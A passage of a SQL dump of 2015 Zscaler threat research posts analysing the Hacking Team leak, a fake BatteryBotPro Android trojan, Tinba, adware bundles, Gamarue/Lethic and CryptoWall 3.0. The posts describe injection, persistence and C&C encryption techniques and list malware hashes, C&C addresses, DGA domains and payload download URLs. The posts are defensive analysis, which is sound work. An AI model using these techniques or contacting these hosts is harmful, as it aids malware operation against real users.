the wild:                	061c086a4da72ecaf5475c862f178f9d  	079a440bee0f86d8a59ebc5c4b523a07  	16ac6fc55ab027f64d50da928fea49ec  	313cf1faaded7bbb406ea732c34217f4  	6d14ba5c9719624825fd34fe5c7b4297  	  	  	  	  	  	  	   	   	   	   	            Conclusion    It will be a challenge for security vendors to get container file detection in place as majority of the time, the embedded content is highly obfuscated with multiple levels of packing. Adobe has already released a patch to fix this issue. We highly recommend enabling the Adobe\'s auto update feature to keep the relevant plugins updated.         References:           	http://malware.dontneedcoffee.com/2015/07/hackingteam-flash-0d-cve-2015-xxxx-and.html', 'Vulnerability;Zero Day', 'https://www.zscaler.com/blogs/research/adobe-flash-vulnerability-cve-2015-5119-analysis');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (134, 'Hacking Team Leak, Flash 0day, Exploit Payloads And More', 'Deepen Desai', 'July 08, 2015', '[Update - July 13, 2015]    In addition to the Flash 0day exploit that we reported earlier [CVE-2015-5119], two new Flash 0day exploits were found in the Hacking Team\'s leaked data and these flaws are not yet patched:        	CVE-2015-5122: valueOf use after free vulnerability during the assignment to freed TextBox      Two in-the-wild samples reported here      	  	  		31d03169b9742a0ff04e3d24bb448bbf  		fcecd6b624bb50301a17d5aa423e135d  	  	        	CVE-2015-5123: valueOf use after free vulnerability during the assignment to freed Bitmap        Adobe acknowledged these issues over the weekend and is working on a patch. Meanwhile, ThreatLabZ has deployed additional coverage for these new exploits to protect Zscaler customers. We are continuously monitoring for new in-the-wild exploit payloads for these flaws.    Introduction    Data breaches have become a common and painful reality. Major enterprises, including retailers and financial institutions have been affected in the past few years. Even cyber criminals are not spared from breaches, with various malware code leaks, the most recent being that of the KINS 2.0 Banking Trojan family.         Earlier this week, we saw a large stolen information archive (400 GB) being published that belonged to the notorious Italian hackers-for-hire firm - Hacking Team. Hacking Team has been known to sell offensive surveillance technology to government agencies worldwide. The archive contains e-mails, invoices, and more importantly exploits & malware source codes. An individual that goes by the handle PhineasFisher has taken credit for the attack and if that name sounds familiar it\'s because he\'s done similar work before, having hacked and leaked data from Gamma International last year. His motivation for that breach was apparently similar as he accused the firm of selling surveillance tools to repressive regimes. While our assessment is far from over, in this blog, we will provide a quick run down of what we have seen in the archive related to exploits & malware thus far and we will continue to update as we discover more details.    Exploits, Remote Control System, and more        	Flash 0-day exploit with Proof-Of-Concept (POC) [CVE-2015-5119] - Confirmed 0day for the latest version of Adobe Flash Player, running on Windows XP and Windows 7. The exploit did not succeed on Windows 8.1. We also saw support for targeting OS X. This is a Use-After-free vulnerability in Adobe Flash player\'s built-in ByteArray class that can lead to crash or remote code execution by the attacker.       Affected applications:        	The majority of the popular browsers including Chrome, FireFox, Internet Explorer and Safari with Flash Player installed are vulnerable to this issue.  	Microsoft Office 2007/2010/2013 - where the attack scenario will involve an office document with the malicious SWF file embedded in it. The document may arrive via an e-mail or as a drive-by download on the target system.        Adobe released a patch today to address this vulnerability.      	Microsoft Windows Kernel code injection vulnerability exploit that can be leveraged to perform privilege escalation on the target system to bypass various security mechanisms        	Support for iOS devices - They are leveraging the popular iOS Jailbreak application Cydia for iOS devices to further install malicious payloads on the target device.        	Support for Android Devices - There is a separate module for Android OS (Android Webkit) that is leveraging a probable 0day exploit [we are still working on confirming this] in the Android browser and running various known root-access exploits like exynos, gingerbreak, levitator, etc. to root the target devices and further install malicious payloads.         	Support for Windows & Blackberry devices - We also saw source code for supposed exploits that will target Windows Phone 8 as well as Blackberry devices.         	MacOS Rooting exploit to enable online and offline installation of untrusted applications.        	A Remote Control System (RCS) Dropper module that is capable of creating both mobile and computer system payloads for Windows and Macintosh.         	A multi-stage JAVA exploit module that contains a weaponized version as well as a two stage version with features to by pass Microsoft Security Essentials and an example Trojanized Putty.exe payload.        	Multiple driver files that may contain Rootkit functionality to hide the malicious process and evade detection.        	Source code of the core Remote Control System module where we can see the in-depth list of features supported by it.      core-win32:    1.) Monitoring modules for Instant messengers, Web Browsers, PC cameras & microphones, etc.  2.) Monitoring social media activities over Yahoo, Gmail, Twitter, and Facebook  3.) Hooking Outlook and getting email and contact details.  4.) Relaying infected system information including time, battery status, processor, memory, OS, user etc..  5.) Advanced keylogging capabilities     We also observed support for 64-bit operating system target.      	There are also multiple anti-VM, anti-Sandbox, and anti-AV evasion modules present in the source code archive.      We are still combing through the archive evaluating more exploits and we will continue to publish our findings as they emerge.    Loader configuration server    We saw a hardcoded IP address in the first stage shellcode payload that is supposedly hosting the configuration file as seen below           	  		  			  		  		  			Hardcoded configuration file location  		  	           The shellcode payload is presumably used by the loader for downloading and installing the main RCS component following a successful exploitation attempt. A quick VirusTotal lookup for the IP address reveals lot of interesting activity in the past two months only:           	  		  			  		  		  			VirusTotal report for the Configuration Server  		  	      Enterprises would be advised to block the aforementioned IP address if they are concerned that they may have been targeted by any of the Hacking Tools applications.    Conclusion    As has been the case in the past after any such leak, we will start seeing the leaked code being incorporated into many future spin offs as well as existing malware families as feature upgrades. Exploit Kit authors have already incorporated the Flash 0day payload in their exploit arsenal as noted here.         ThreatLabZ has ensured coverage for the Flash 0day (CVE-2015-5119) and other exploit payloads ensuring protection for the Zscaler customers. We will continue to monitor further developments surrounding this leak.         Research by: Abhay Yadav, Nirmal Singh, Deepen Desai', 'Data Breach;Malware;Vulnerability;Zero Day', 'https://www.zscaler.com/blogs/research/hacking-team-leak-flash-0day-exploit-payloads-and-more');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (135, 'Fake BatteryBotPro ClickFraud, AdFraud, SMS & Downloader Trojan', 'Shivang Desai', 'July 06, 2015', '[UPDATE #1 - July 8, 2015] We would like to clarify that at the time of our analysis, the app was not present on the Google Store. We found references to this fake app being hosted on the Google Play store during our research where it showed that the App has been removed from the Google Play store already as seen below:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Link to Google Play Store for the fake app\r\n		\r\n	\r\n\r\n.....\r\n\r\n[UPDATE #2 - July 9, 2015] Google Android security team confirmed that the fake application was uploaded to the Google Play Developer Console by the miscreants.\r\n\r\nGoogle Play Developer Console enables developers to easily publish and distribute their applications directly to users of Android-compatible phones\r\n\r\nHowever, as per Google\'s Android team the fake app did not make it to the official Google Play Store as Google\'s security system flagged the fake app during scanning.\r\n\r\n.....\r\n\r\nMalware authors tend to follow one of the following two methods for malware development:\r\n\r\n	Create a malware app from scratch.\r\n	Compromise a legit app by embedding malicious modules into it. \r\n\r\nWith Android being open source and an Android app being easily reversible, most of the malware developers tend to stick with the second option.\r\n\r\nSpoofed Functionality and Ads:\r\n\r\nWe came across a malicious app recently that followed this path. This time the spoofed app was a copy of a legit app named BatteryBot Pro. The spoofed app had the package name of \'com.polaris.BatteryIndicatorPro\' and was removed from the Play Store as soon as Google became aware of it\'s malicious intent.\r\n\r\nWe also saw a spoofed version of BatteryBot Pro available for free during our research. The actual price of BatteryBotPro on official Play Store is Rs.179.99. The legit BatteryBotPro app demanded for minimal permissions as shown below:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Legit app permissions\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nIn contrast, the fake app was requesting many more permissions, raising a red flag as can be seen in the screenshot below:\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Permission requested by Malware\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe screenshot below shows a comparison between the actual app and the fake app. The legit app functionality was modified and embedded at a different location within the fake app:\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			legit app vs fake app\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\nUpon installation of the malicious app, it demanded administrative access, which clearly portrays the motive of malware developer to obtain full control access of the victim\'s device.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Request for Administrator access\r\n		\r\n	\r\n\r\n\r\n \r\nOnce the permission is granted, the fake app will provide the same functionality to the victim found in the original version of BatteryBot Pro but performs malicious activity in the background.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			opening BatteryPro screen\r\n		\r\n	\r\n\r\n\r\nClickFraud and AdFraud activity\r\n\r\nThough the app seems to be working normally, at the back-end it tried to load various ad libraries, ultimately delivering a click fraud campaign.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Requests sent in back-end\r\n		\r\n	\r\n\r\nSome of these URLs were hard coded in the app and some were sent by the remote server.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Hard-coded URLs in database\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe malware tries to collect the following information from the victim device:\r\n\r\n-Memory available in device\r\n-IMEI\r\n-Phone Operator\r\n-Location\r\n-Langauge\r\n-Phone Model\r\n-Sim Card availability\r\nThe following screenshot shows the data being collected.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Parameters sent to server\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Parameters sent to server\r\n		\r\n	\r\n\r\nOn the basis of various parameters and conditions in the server request, the malware starts receiving a list of ads to be displayed, along with the URLs from where to fetch the ad.s\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Response from server containing ad URL\r\n		\r\n	\r\n\r\n\r\nThe malicious app then downloads and installs additional malicious APKs without the user\'s consent:\r\n \r\n  \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Downloaded Apps by malware\r\n		\r\n	\r\n\r\nApart from the implicit downloads, the malware also displays pop-up ads to the user:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Pop up Ads\r\n		\r\n	\r\n\r\n\r\nThis malware was not only built with the purpose of displaying ads, it was also designed with more evil intentions.\r\n\r\nSending SMS messages: \r\n\r\nThe main Activity Screen is identical to original app but when the user clicks on \"View Battery Use\", the malware sends a few requests to its Command & Control server to retrieve short codes. These short codes were premium rate SMS numbers where a message was sent. This will result in financial loss to the affected user.\r\n\r\nRequests sent to server can be seen below:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Device info sent in request\r\n		\r\n	\r\n\r\n\r\nThough the content was encoded, we did not have to work hard to determine what was sent as the malware developer forgot to remove the logs. The server responds with short codes that are used for sending messages. The following screenshot shows a premium SMS response received from the server.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Logs showing server response\r\n		\r\n	\r\n\r\n\r\n \r\nUninstall FAILED: \r\n\r\n \r\nApart from displaying ads and sending SMS message, the malware is also very persistent. Being run with administrator privileges, the user cannot delete the app after installation.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Uninstall not possible\r\n		\r\n	\r\n\r\n\r\n \r\n\"Persistence\" Effect:\r\nWhile  in some of the scenarios we were able to manually delete the app, the malware authors have taken care of ensure persistence. The malware silently installs an app with a package name of com.nb.superuser, which runs as a different thread and resides on the device even if the app is forcefully deleted.\r\n\r\nThis acts as a service and sends requests to hard-coded URLs found in the app.\r\nThe screenshot below shows the hard coded URLs.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Hard-coded URLs\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\nThe service started by this app continually sends requests to aforementioned URLs, some of which will deliver new APKs.\r\n\r\nConclusion: \r\n\r\n\r\nThe Malware we saw in this blog was designed with multiple evil intentions including ClickFraud, AdFraud, Premium rate SMS fraud and the download & installation of additional malicious APKs.\r\n\r\n \r\nA few traces of command execution were also seen in the app but were not fully implemented. Perhaps the developer is working on an upgraded version of the malware with proper \"command-execution\" functionality.\r\n\r\nThe ThreatLabZ team will continue monitoring new mobile malware threats and ensure protection for Zscaler customers.', 'Click Fraud;Malware;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/fake-batterybotpro-clickfraud-adfraud-sms-downloader-trojan');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (136, 'A Look At Recent Tinba Banking Trojan Variant', 'Dhanalakshmi', 'July 05, 2015', 'Introduction     Tinba is information stealing Trojan. The main purpose of the malware is to steal information that could be browsing data, login credentials, or even banking information. This is achieved through code injection into system process (Winver.exe and Explorer.exe) and installing hooks into various browsers like IExplorer, Chrome, Firefox and Opera.    Tinba has been known to arrive via spammed e-mail attachments and drive-by downloads.  Recently, Angler Exploit Kit instances were also found to be serving Tinba banking Trojan as seen here.    Detailed Analysis of Tinba    Tinba is packed with a custom packer and uses well known anti-debugging technique using the WinAPI function “IsDebuggerPresent” to hinder reverse engineering of the binary image. The execution flow of the infection cycle for Tinba is shown below.    	  		  			  		  		  			Execution flow of Tinba  		  	      The image below shows the custom packer code being used by the Tinba sample we were looking at.              	  		  			  		  		  			Tinba unpacking Routine  		  	    The unpacked binary image is shown below which upon execution will perform code injection into system processes like Winver.exe and Explorer.exe.         	  		  			  		  		  			Unpacked Binary  		  	    It generates Mutex name using root volume information of the victim’s machine as shown below.       	  		  			  		  		  			Mutex name generation  		  	    Remote Thread in System Process     A remote thread is created inside Explorer process that is responsible for creating a copy of Tinba Binary in %APPDATA% & auto start registry entry in Registry hive.       	  		  			  		  		  			Explorer remote thread  		  	         The Tinba binary is stored in a hidden folder which is created under %APPDATA% directory:        C:\\Documents and setting \\username \\Application Data\\mutexname\\bin.exe  It also creates an auto-run registry entry to execute Tinba binary during every windows start-up as shown below:              	  		  			  		  		  			Auto start registry entry  		  	      Another thread is also created in Explorer process which is responsible for generating DGA (Domain Generation Algorithm) domains and injecting code into browsers like IExplorer, Chrome, Firefox and Opera.       	  		  			  		  		  			Explorer local thread  		  	    Domain Generation Algorithm    The following is the Domain Generation Algorithm (DGA) used by Tinba variant where every sample uses a hardcoded domain and seed to generate the DGA domains.       	  		  			  		  		  			DGA routine  			   			   		  	             	  		  			  		  		  			Hardcoded Domain and seed  		  	    These DGA domains are fast flux domains where single domain is frequently switched to different IPs by registering it as part of the DNS A record list for a single domain.      	  		  			  			     			  				  					  						  						targetHost  						  						  						targetIP  						  					  					  						  						eudvwwwrmyqi.in  						  						  						89.111.166.60  						  					  					  						  						eudvwwwrmyqi.in  						  						  						95.163.121.94  						  					  					  						  						jrhijuuwgopx.com  						  						  						176.31.62.78  						  					  					  						  						jrhijuuwgopx.com  						  						  						176.31.62.77  						  					  					  						  						norubjjpsvfg.ru  						  						  						210.1.226.15  						  					  					  						  						norubjjpsvfg.ru  						  						  						104.223.122.20  						  					  					  						  						norubjjpsvfg.ru  						  						  						104.223.15.16  						  					  					  						  						scpxsbsjjqje.ru  						  						  						5.178.64.90  						  					  					  						  						scpxsbsjjqje.ru  						  						  						192.198.90.228  						  					  					  						  						scpxsbsjjqje.ru  						  						  						5.178.64.90  						  					  					  						  						wgwnmffclqvu.ru  						  						  						192.198.90.228  						  					  					  						  						wgwnmffclqvu.ru  						  						  						192.3.95.140  						  					  				  			  			  			   		  	      Remote Thread in browsers    The Explorer thread searches for browser process either by checking path of the browser executable or by loaded application specific DLL (e.g. NSS3.dll for firefox.exe). If the targeted browser process is found, then the secondary thread is created in the process.       	  		  			  		  		  			Browser thread  		  	    This thread is responsible to get updated Bot configuration details like Target URL list and strings (BOTUID ) from a remote C&C server. If there is no updated list of target URLs from C&C server, then it uses default targeted list of URLs which is stored in the injected code. The list of default target URLs after decryption is shown below.       	  		  			  		  		  			Default Targeted URL list  		  	    The collected information form webmail, social media and the banking sites are stored in \"log.dat\" file.       	  		  			  		  		  			Log file path  		  	    C&C communication & Cryptography:     The POST request to C&C server contains encrypted system information like system volume & version information.  The cryptography routine is a simple byte \'XOR\' with an 8 bit \'ROR\' of the key after each write.     	  		  			  		  		  			Send Data Encryption  		  	      A sample Tinba POST request to DGA domains with 157 bytes of encrypted data is shown below.       	  		  			  		  		  			C&C POST Request  		  	    Geo distribution of C&C call back attempts that we blocked in past one month:       	  		  			  		  		  			Geo Location  		  	    We have seen following C&C server IP addresses:      	103.1.149[.]36  	104.223.122[.]20  	104.223.15[.]16  	104.223.15[.]234  	104.255.97[.]136  	104.255.97[.]15  	162.218.89[.]118  	176.31.62[.]77  	176.31.62[.]78  	192.198.90[.]228  	192.210.139[.]138  	192.3.95[.]140  	198.100.29[.]2  	198.56.237[.]21  	210.1.226[.]15        	5.178.64[.]90  	5.2.189[.]251  	82.165.37[.]127  	89.111.166[.]60  	95.163.121[.]94    Conclusion:         Tinba also known as small banking Trojan continues to be prevalent in the wild.  The arrival method varies from e-mail spam, drive-by downloads and most recently Exploit Kit infection cycle. Zscaler ThreatlabZ is actively monitoring this malware family and ensuring coverage for our customers.', 'Analysis;Exploit Kit;Malware', 'https://www.zscaler.com/blogs/research/look-recent-tinba-banking-trojan-variant');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (137, 'Potentially Painful Programs Promising Pirated Products', 'Chris Mannon', 'June 26, 2015', 'A major source of PC compromise doesn\'t come from targeted APT campaigns or Exploit Kits, but user\'s clicking things that they simply shouldn\'t. A common practice for adware and spyware writers is hosting large numbers of seemingly legitimate files that users might trust from an unknown source. Users know trusted download locations for common packages like Flash Player or Skype, but when searching for pirated software or media, any link that promises results becomes a trusted source. ThreatLabZ has been monitoring a large campaign of two well known adware/spyware packages, namely OutBrowse and MultiPlug.\r\n\r\nThreatLabZ has observed filenames purporting to be popular software applications, PC games, movies, TV series, car repair guides, etc. being used to trick users into downloading and running spyware packages. Below is a sample list of filenames from this month:\r\n\r\n	Colin McRae Rally 2.0 Full Version - FullRip   Download Low Spec PC Games   RataMap   Download Low End PC Games.exe\r\n	adobe acrobat 8 standard serial number generator.exe\r\n	dell bluetooth headset bh200 driver.exe\r\n	Wii dance revolution.exe\r\n	Besiege Free Download Game.exe\r\n	Tropico Reloaded   Free Download PC Game Full Version.exe\r\n	Minecraft 1.8 Crack Full Free Download.exe\r\n	Dragon Ball Complete Series Episode1.exe\r\n	Home.2015.720p._-DL.MaZiKa2daY.CoM.mkv.exe\r\n	visual studio 2012 crack torrent.exe\r\n	LEXUS LS 460 user guide provided through pdfretriever.com.exe\r\n\r\nOnce installed, the user is shown unsolicited advertisements and experiences a substantial increase in browser tracking activity. We noticed the cyber-criminals involved in these campaigns heavily leverage .info TLD domains as seen in the table below:\r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n			Domain\r\n			\r\n			\r\n			Adware Family\r\n			\r\n		\r\n		\r\n			\r\n			a.webboxwebs[.]info\r\n			\r\n			\r\n			MultiPlug Adware\r\n			\r\n		\r\n		\r\n			\r\n			get1.0111design[.]info\r\n			\r\n			\r\n			Outbrowse Adware\r\n			\r\n		\r\n		\r\n			\r\n			a.positionpublic[.]info\r\n			\r\n			\r\n			MultiPlug Adware\r\n			\r\n		\r\n		\r\n			\r\n			a.parser-case-croc[.]info\r\n			\r\n			\r\n			MultiPlug Adware\r\n			\r\n		\r\n		\r\n			\r\n			get.0136g[.]info\r\n			\r\n			\r\n			Outbrowse Adware\r\n			\r\n		\r\n		\r\n			\r\n			a.linuxcallring-north[.]info\r\n			\r\n			\r\n			MultiPlug Adware\r\n			\r\n		\r\n		\r\n			\r\n			a.northsinglemultiple[.]info\r\n			\r\n			\r\n			MultiPlug Adware\r\n			\r\n		\r\n		\r\n			\r\n			get.0136h[.]info\r\n			\r\n			\r\n			Outbrowse Adware\r\n			\r\n		\r\n		\r\n			\r\n			a.valuevilleville[.]info\r\n			\r\n			\r\n			MultiPlug Adware\r\n			\r\n		\r\n		\r\n			\r\n			a.cooledon[.]info\r\n			\r\n			\r\n			MultiPlug Adware\r\n			\r\n		\r\n		\r\n			\r\n			a.beeforcelevel[.]info\r\n			\r\n			\r\n			MultiPlug Adware\r\n			\r\n		\r\n		\r\n			\r\n			a.stickercenter[.]info\r\n			\r\n			\r\n			MultiPlug Adware\r\n			\r\n		\r\n		\r\n			\r\n			get.0136i[.]info\r\n			\r\n			\r\n			Outbrowse Adware\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\nOutBrowse\r\n\r\nThe OutBrowse family authors leverage popular TV shows, software applications and trending news to deliver custom payloads that monitor the user\'s browsing activity. Their business model is to direct users to a pay site that provide various services.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Didn\'t I just download Tony Hawk Pro Skater2.Crack.CDKEY.exe?\r\n		\r\n	\r\n\r\nThe phone home communication for OutBrowse also provides excessive information to the advertisers. This data often includes the system\'s MAC address, IP address, different browser versions installed, and the machine GUID.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Data Collection from the victim\'s system.\r\n		\r\n	\r\n\r\n\r\nOutBrowse beacons to several domains to share machine details and send aggressive advertisements. We have been monitoring this activity to the following domains for several months:\r\n\r\n	srv.dmdataserver[.]com\r\n	static.revenyou[.]com\r\n	srv.desk-top-app[.]info\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Consistent traffic to known Outbrowse beacons\r\n		\r\n	\r\n\r\n\r\nOutBrowse is normally found on the victim\'s machine by inspecting the user\'s C:\\Documents And Settings\\user\\Local Settings\\Temp\\ directory for any suspicious files. It\'s common for OutBrowse to also install other bundled software packages as well. Users should check their autostart programs and Browser Helper Object (BHO) entries for software that is suspicious.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			OutBrowse installed MiniGet as a BHO and Content Menu in Internet Explorer\r\n		\r\n	\r\n\r\n\r\n\r\nMultiPlug\r\n\r\nMutliPlug is another adware package that is installed as part of this campaign. The purpose of this package is to provide a custom executable to the victim that leads to additional bundleware. After a successful MultiPlug infection, we noticed applications like LightningDownloader, SeekerFoobar, WeatherBug, and EasyAutoRefresh getting dropped on the victim machine.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Silent Installers seen to download additional adware packages.\r\n		\r\n	\r\n\r\nOnce MultiPlug is installed, it starts downloading and installing additional packages in the background while displaying unsolicited advertisements.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			A common location-targeted advertisement seen from a package installed by MultiPlug\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Highly aggressive advertisements attempting to lead the victim to buying software.\r\n		\r\n	\r\n\r\n\r\nThe best way to remediate this attack is to review all installed programs through Windows Control Panel and odds are good that MultiPlug installed at least multiple unwanted software packages. Once this is done, users should review their autostart job files in the C:\\WINDOWS\\Tasks\\ directory for anomalous entries. Installed Browser Helper Objects should also be checked using applications like HiJackThis or X-rayPC.\r\n\r\nThreatLabZ has been closely monitoring these campaigns for the past few months and the trend shows no sign of slowing down as seen in the time chart below:\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Several sites are phishing users with the promise of illegally obtained content\r\n		\r\n	\r\n\r\n\r\nThe bulk of these attacks are hosted in the United States.\r\n \r\n \r\n\r\n\r\n\r\n\r\n\r\nConclusion\r\n\r\n\r\n\r\nThe moral of this story is to not trust seemingly legitimate content if you are attempting to obtain it illegally. Users show a distinct lapse in judgment when they believe the desired content is available for free. We recommend not attempting to pirate content and simply paying for the media desired.', 'Advertising;Analysis;Malware', 'https://www.zscaler.com/blogs/research/potentially-painful-programs-promising-pirated-products');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (138, 'Gamarue Dropping Lethic Bot', 'Amandeep Kumar', 'June 11, 2015', 'The Gamarue (aka Andromeda) botnet is a highly modular botnet family that allows attackers to take complete control of an infected system and perform a range of malicious activity by downloading additional payloads. In this blog, we will cover a recent Gamarue infection that we looked at, which downloads and installs the Lethic bot on an infected system.         The Lethic botnet has been known to be involved in pharmaceutical and replica spam since it\'s inception as was detailed by Arbor Networks here. Neither of these botnets are new and have both survived takedown attempts by authorities. The Gamarue infection in our case was leading to the download of Lethic bot from the following URLs:                   	  		  			  			Lethic Bot URLs  			  		  		  			  			155[.]133.18.45/nut40a361.exe  			  		  		  			  			155[.]133.18.45/dq40a361.exe  			  		  		  			  			155[.]133.18.45/dqfjr73.exe  			  		  		  			  			155[.]133.18.45/85fjr73.exe  			  		  		  			  			155[].133.18.45/112fjr73.exe  			  		  	      (MD5: F909BE6B96C10E36F3C5B9E676F49C7E)                During our analysis, we noticed that the Gamarue and Lethic payloads involved in this infection were both packaged using the same custom packer. Below is the comparison of the code snippet from the packer routine:                         Quick Analysis of Lethic bot            Installation           The payload first checks the current running path. If the path does not contain “RECYCLER\\S-1-5-21-0243556031-888888379-781862338-1861771”, it will create a new folder in “C:\\RECYCLER” with a name of “S-1-5-21-0243556031-888888379-781862338-1861771” and then drops a copy of itself with the name “gBvhieXlS1.exe”. It also changes the attributes of the file to make it a system and hidden file.             	  		  			  		  		  			Creating Path For Dropping File  		  	                It then creates “Run” and “RunOnce” registry keys with “fBvhieXlS1” as key name.        	  	“HKEYCURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run”  	  	  	“HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce”  	        	  		  			  		  		  			RunOnce Key Created  		  	           Remote Process Injection         Depending on the system CPU architecture, it utilizes one of these two methods to inject itself into explorer.exe:               	For a 32-bit CPU architecture, it attempts to get the handle to the existing explorer.exe process and injects a malware module into it. It executes the injected code by calling “CreateRemoteThread” and terminates itself.        	For a 64-bit CPU architecture, it creates a new explorer.exe process in suspended mode and then injects the malicious code into it. It follows this method if the processor architecture is x64 (AMD or Intel) or Intel Itanium-based.          The following screenshot shows the instructions that the payload uses to identify the correct path to the explorer.exe file, taking into account both 32-bit and 64-bit versions of the Windows Operating System:             	  		  			  		  		  			Function to get the path of explorer.exe  		  	                Network communication           The Lethic bot connects to a predetermined Command and Control (C&C) server at 93.190.137.107 on port 9900. We noticed several connection failures before a successful connection attempt to the C&C server. We believe that this is the malware author\'s attempt to evade automated analysis systems. Shown below is a snapshot of the network communication:             	  		  			  		  		  			Command from C&C server  		  	                  Lethic bot uses the infected machine as a SMTP proxy as evident in the network communication below:             	  		  			  		  		  			SMTP proxy traffic  		  	         Conclusion    Gamarue & Lethic malware families have both survived takedown attempts and continue to be active in the wild. ThreatlabZ is actively monitoring these two malware families and ensuring coverage for our customers.           Analysis by:  Amandeep Kumar and Nirmal Singh', 'Malware', 'https://www.zscaler.com/blogs/research/gamarue-dropping-lethic-bot');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (139, 'Signed CryptoWall 3.0 Variant Delivered Via MediaFire', 'Deepen Desai', 'June 04, 2015', 'Introduction  Ransomware has evolved immensely over the past few years, with CryptoLocker being the ground breaking strain reaping huge profits for cybercriminals. According to a report in December 2013, the CryptoLocker malware authors collected 27 million USD worth of bitcoins from their victims over a period of 3 months. Looking at the success enjoyed by the CryptoLocker strain, it\'s not surprising that many new copy cat variants including CryptoWall emerged in the wild starting in late 2013.    CryptoLocker suffered a major setback and the number of infections were reduced to nearly zero post Operation Tovar. This gave way to a worthy successor in CryptoWall, which has since evolved into one of the nastiest and most successful strains of Ransomware in the wild today.    The following are some of the notable features responsible for the success enjoyed by CryptoLocker and CryptoWall variants:    	Asymmetric (public-key) encryption to encrypt user documents, making recovery infeasible  	Holding user files hostage with a timer that increases the ransom amount over time  	Ransom collected in bitcoins or as pre-paid cash vouchers  	Usage of anonymizing networks like Tor & i2p      Recent \'crypt4\' campaign - CryptoWall 3.0  CryptoWall has been known to arrive via spammed e-mail attachments, exploit kits and drive-by downloads. Recently, we started seeing a new campaign involving multiple signed CryptoWall 3.0 samples in our Cloud Sandboxes being downloaded from a popular file hosting service, MediaFire.    A quick Open Source Intelligence (OSINT), search lead us to this e-mail campaign where the attachment contains a Microsoft Compiled HTML help (CHM) file that leads to the download and execution of the the latest CryptoWall 3.0 variant hosted on MediaFire. The CHM file downloads and executes the CryptoWall executable from a hardcoded MediaFire location as seen in screenshot below:       	  		  			  		  		  			Malicious CHM file - Extracted HTML code  		  	         Some of the file names we have seen in this campaign:    	IPv6_updater.exe  	IPv4_updater.exe  	flashplayer17_ga_install.exe    Analysis of the new variant    The CryptoWall 3.0 payloads that we saw getting downloaded as part of this campaign were all signed by a valid certificate belonging to MDG Advertising as seen in the screenshot below:       	  		  			  		  		  			  			  				  					  						Valid MDG Advertising certificate used to sign CryptoWall 3.0  					  				  			  			  		  	        The malware performs following file system changes to ensure persistence:    	Dropped files      %USER%\\APPDATA\\7cc6cc79.exe [random alphanumeric name]  %USER%\\Start Menu\\Programs\\Startup\\7ddfa86e.exe [random alphanumeric name]      	Registry entry      HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run dd574bd = \"%USER%\\APPDATA\\7cc6cc79.exe\"  It also deletes the original copy of itself.    The malware then attempts to connect to the Command & Control (C&C) server to report the infection via a POST request as seen below:       	  		  			  		  		  			C&C communication - Register infection  		  	        It uses RC4 encryption for the data being sent in the POST request. The original data is of the format  {1|crypt4|UniqueMD5Hash|2|1|2|PublicIP}    - \"crypt4\" string represents the Campaign ID  - \"UniqueMD5Hash\" is calculated from Computer Name, Volume Serial Number, Processor & OS information  The RC4 key is generated by doing a simple alpha-numeric sort on a string stored inside the binary as seen in the screenshot below. The unsorted RC4 key is also sent as part of the POST request.       	  		  			  		  		  			RC4 Key encrypted POST request to C&C server  		  	        The malware then performs another POST request and in response it gets RC4 encrypted Tor domain & public key to use for encrypting the victim files. The Tor domain is leveraged for the decryption instruction. Screenshots below, show the original communication & decrypted response:         	  		  			  		  		  			C&C communication - Requesting Public Key  		